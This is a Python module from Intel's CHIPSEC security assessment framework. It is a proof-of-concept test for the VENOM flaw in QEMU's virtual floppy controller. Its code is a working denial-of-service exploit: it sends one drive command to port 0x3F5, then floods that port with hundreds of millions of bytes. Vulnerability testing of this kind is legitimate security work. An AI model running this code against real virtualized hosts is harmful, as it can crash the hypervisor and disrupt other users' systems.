#CHIPSEC: Platform Security Assessment Framework
#Copyright (c) 2010-2015, Intel Corporation
# 
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; Version 2.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
#Contact information:
#chipsec@intel.com
#



"""
QEMU VENOM vulnerability DoS PoC test
Module is based on http://bluereader.org/article/41518389
which is based on PoC by Marcus Meissner (https://marc.info/?l=oss-security&m=143155206320935&w=2)

 Usage:
   ``chipsec_main.py -i -m tools.vmm.venom``
"""

from chipsec.module_common import *

_MODULE_NAME = 'venom'

FDC_PORT_DATA_FIFO = 0x3F5
ITER_COUNT         = 0x10000000
FDC_CMD_WRVAL      = 0x42
FD_CMD             = 0x8E # FD_CMD_DRIVE_SPECIFICATION_COMMAND # FD_CMD_READ_ID = 0x0A

class venom (BaseModule):

    def venom_impl( self ):
        self.cs.io.write_port_byte( FDC_PORT_DATA_FIFO, FD_CMD )
        for i in range( ITER_COUNT ):
            self.cs.io.write_port_byte( FDC_PORT_DATA_FIFO, FDC_CMD_WRVAL )
        return True

    def run( self, module_argv ):
        self.logger.start_test( "QEMU VENOM vulnerability DoS PoC" )
        return self.venom_impl()
